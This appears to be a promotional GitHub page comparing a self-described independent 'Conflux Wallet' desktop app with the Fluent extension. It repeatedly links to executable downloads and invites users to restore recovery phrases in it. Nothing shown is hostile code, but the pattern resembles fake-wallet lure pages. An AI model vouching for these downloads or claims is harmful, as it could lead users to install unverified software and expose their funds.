![Conflux Wallet](assets/banner-article.png)

# Conflux Wallet vs Fluent

<p align="center">Conflux Wallet vs Fluent: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Fluent is a browser-extension wallet that the Conflux Foundation's own wallet page lists as the ecosystem's supported extension. Conflux Wallet is an independent desktop application for Windows, macOS and Linux that handles Core Space and eSpace in one window. One lives in the browser; the other is a program on your machine.

## The short comparison

<div align="center">

| | Conflux Wallet | Fluent |
|---|---|---|
| Form | Desktop application | Browser extension |
| Spaces | Core Space and eSpace | Core Space and eSpace |
| Custody | Self-custody, keys on the machine | Self-custody in the extension |
| Hardware | Ledger and Trezor support | Works with Ledger in Chrome or Edge |
| Relationship to the Foundation | Independent third party | Listed on the Foundation's wallet page |

</div>

Both are real and neither is a scam - the choice is about where you want your keys to sit, not about which one is legitimate.

## What each one is

Fluent is an extension: it installs into a Chromium-based browser and appears when a site asks for a wallet. That is its advantage and its constraint, because an extension necessarily runs inside the same browser that renders every page you visit.

Conflux Wallet is a standalone desktop program, separate from the browser entirely. It holds keys, signs transactions and manages staking in its own window, and no web page can reach it. That separation is the whole argument for the desktop shape, and it is why this product exists at all rather than as another extension. https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md describes what that buys and what it costs.

## Where the browser wallet wins

Reaching dApps. A site's "connect wallet" button looks for an extension, and an extension is what answers it; a desktop application cannot inject into a page. If your work is DeFi, mints and contract interactions, an extension is the shorter path.

It is also the lighter install: no application to update, no separate program to keep current, and it follows you between machines through the browser's own profile - with everything that implies for a shared computer.

## Where the desktop app wins

Separation from the web. A program that no page can address has no provider for a malicious script to call, and that removes an entire category of attack rather than mitigating it. Signing happens in a window with no site in it.

Breadth of the two spaces is the other advantage: Core Space staking, voting, cross-space transfers and both hardware integrations live in the same interface, instead of being split between an extension and a separate tool. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/stake-cfx-in-conflux-wallet.md is what that looks like in practice.

## Staking and both spaces

Both products handle Core Space and eSpace, and in both the two accounts are separate: the same phrase derives a `cfx:` address and a `0x` address that are not the same wallet. Neither product can send between them as an ordinary transfer.

Where they differ is emphasis. Staking is a first-class screen in the desktop app, with staked, unlocking and reward balances shown separately rather than being one more action in a panel that also handles tokens and sites. The operation underneath is identical in either product: a Core Space transaction against the network's staking rules. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md is the background either way.

## Hardware signing

A Ledger works with both, and both sign on the device. Fluent's documented Ledger support requires Chrome or Edge, with Firefox unsupported, because an extension depends on the browser's own device connection; the desktop application talks to the device directly and is not affected by which browser you prefer.

Trezor is the uneven one: documented for eSpace, claimed for Core Space without independent corroboration. Whichever product you use, test that before relying on it. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md covers the pairing.

## Keys and recovery in both

Both are self-custody, which means the same thing in each: a recovery phrase generated at setup, an encrypted store on the device, and no server that can restore anything. Neither can reset a password, and neither can recover funds without the phrase.

That is the property that makes the comparison mostly about ergonomics. A wallet that holds your keys is only as good as your backup, and both products will lose your account just as thoroughly if the phrase is gone.

## Which fits which reader

If you spend your time in dApps and want one click from a page, use the extension. If you hold CFX for the long term, stake, vote, or want a key store that no website can reach, use the desktop application.

Plenty of people use both: the extension for contracts, the desktop app for custody and staking, with the same phrase restored in each. The dividing line is simple - reach for anything interactive, keep isolation for everything you intend to hold - and the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is what to install on the custody side. That is a reasonable arrangement as long as you understand it doubles the number of places the phrase exists.

## Can you use both

Yes. The phrase is portable, so the same accounts appear in either product; that is what a recovery phrase is for. The two installations are independent copies, and neither is a backup of the other.

If you do run both, keep the phrase in one offline place rather than in either wallet's notes, and treat a compromise of either machine as a compromise of the account. https://github.com/conflux-developments/setup-handbook/blob/HEAD/which-wallets-support-conflux.md covers the wider landscape without the head-to-head framing. Conflux Wallet is actively maintained; the current release on the release page is where fixes ship, rather than as patches to an old copy.

## FAQ

### Is Conflux Wallet better than Fluent?

They suit different jobs. The extension reaches dApps because it lives in the browser; the desktop app keeps keys away from the browser and puts staking and both spaces in one window.

### Does Fluent support both Conflux spaces?

Yes, Core Space and eSpace, with separate accounts from the same phrase - the same structural split every Conflux wallet has.

### Can I use my Fluent phrase in Conflux Wallet?

Yes. Restore from the phrase in the desktop app and the same accounts appear. Keep the phrase offline rather than in either wallet.

### Does Conflux Wallet work with a Ledger?

Yes, for both spaces, with approval on the device. Fluent also works with Ledger, through a Chromium browser.

### Which one is official?

Neither is a foundation release. Fluent appears on the Foundation's wallet page; Conflux Wallet is an independent third-party application and says so on every page.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [What Is Conflux Wallet?](https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md)
- [Update Conflux Wallet to the Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md)
- [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
